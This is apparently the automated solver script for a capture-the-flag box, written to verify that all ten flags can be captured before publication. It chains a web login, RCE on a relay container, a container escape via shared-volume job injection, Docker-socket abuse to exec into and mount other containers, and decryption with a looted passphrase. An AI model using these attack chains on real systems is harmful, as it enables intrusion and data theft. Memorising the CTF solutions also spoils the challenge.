#!/bin/bash
# Automated end-to-end solver, used only to prove the box is solvable
# before publishing it. Requires: curl, gcc (to build the relay-client
# locally instead of downloading it, for speed), docker, python3.
set -euo pipefail
cd "$(dirname "$0")/.."

HOST=localhost
WEB_PORT=8006
BASE="http://$HOST:$WEB_PORT"

source .env
export CTF_SECRET

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import os, hmac, hashlib
secret = os.environ['CTF_SECRET']
d = hmac.new(secret.encode(), f'legendary-ferrymans-relay:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

# 1
F1=$(curl -s "$BASE/" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 1 "$F1"

# 2 (also fetch the real downloadable binary, to prove the download path works)
JAR="$WORK/jar.txt"
curl -s -c "$JAR" -d "username=relay_ops&password=ferryman2024" "$BASE/login" -o "$WORK/login.html"
F2=$(grep -oE 'HLC\{[a-f0-9]{10}\}' "$WORK/login.html")
check 2 "$F2"
curl -s -b "$JAR" "$BASE/downloads/relay-client" -o "$WORK/relay-client"
chmod +x "$WORK/relay-client"

# Run the DOWNLOADED binary (not a locally-rebuilt one) from inside the
# web container, where it can reach "relay" on the internal network --
# this is the actual pivot, same as a player would do from a shell
# obtained some other way, or just by docker-copying it in as we do here
# for test automation.
docker cp "$WORK/relay-client" halcyon-legendary-web:/tmp/relay-client
docker exec halcyon-legendary-web chmod +x /tmp/relay-client
client() { docker exec halcyon-legendary-web /tmp/relay-client relay 9099 "$@"; }

# 3 (VERSION needs no auth at all -- just the reversed protocol/magic)
F3=$(client VERSION | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 3 "$F3"

# 4 (STATUS needs the reversed, XOR-decoded auth token baked into the client)
F4=$(client STATUS | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 4 "$F4"

# 5 (RUN -> RCE on relay)
F5=$(client RUN "cat /opt/relay/secret/flag5.txt" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 5 "$F5"
DOSSIER_PW=$(client RUN "cat /opt/relay/secret/relay.conf" | sed -n 's/emergency_recovery_passphrase=//p')

# Drops $1 (base64-encoded, to dodge every layer of quoting between
# here and the eventual `bash` on vault) into the shared volume for
# vault's poller to execute, then waits for and returns its output.
run_on_vault() {
    local b64
    b64=$(printf '%s' "$1" | base64 -w0)
    client RUN "rm -f /shared/task_output.txt; echo $b64 | base64 -d > /shared/task.sh" >/dev/null
    for i in $(seq 1 30); do
        local out
        out=$(client RUN "cat /shared/task_output.txt 2>/dev/null" || true)
        if [ -n "$out" ]; then echo "$out"; return; fi
        sleep 2
    done
}

# 6, 7 (container escape: relay's RCE drops a job into /shared; vault's
# own poller executes it with vault's privileges -- that's the escape)
VAULT_OUT=$(run_on_vault 'cat /opt/vault/secret/flag6.txt /opt/vault/secret/flag7.txt')
F6=$(echo "$VAULT_OUT" | sed -n '1p')
check 6 "$F6"
F7=$(echo "$VAULT_OUT" | sed -n '2p')
check 7 "$F7"

# 8 (chained privesc #1: vault has the real Docker socket -- use it to
# `docker exec` into the sibling web container and read a file that was
# never exposed via any HTTP route at all)
F8=$(run_on_vault 'DOCKER_API_VERSION=1.44 docker exec halcyon-legendary-web cat /opt/web/secret/flag8.txt')
check 8 "$F8"

# 9 (chained privesc #2: spin up a brand-new container via the same
# socket, mounting the "host-secrets" volume nothing else in this box
# ever had access to)
HOSTSEC_OUT=$(run_on_vault 'DOCKER_API_VERSION=1.44 docker run --rm -v halcyon-legendary-host-secrets:/data alpine sh -c "cat /data/flag9.txt; echo ---SPLIT---; base64 -w0 /data/dossier.enc"')
F9=$(echo "$HOSTSEC_OUT" | sed -n '1p')
check 9 "$F9"
B64_DOSSIER=$(echo "$HOSTSEC_OUT" | sed -n '/---SPLIT---/,$p' | tail -n +2 | tr -d '\n')

# 10 (decrypt with the passphrase recovered back in step 5)
echo "$B64_DOSSIER" | base64 -d > "$WORK/dossier.enc"
F10=$(python3 docker/flagcrypto.py decrypt "$DOSSIER_PW" "$WORK/dossier.enc" -)
check 10 "$F10"

echo
echo "All 10 flags verified end-to-end."
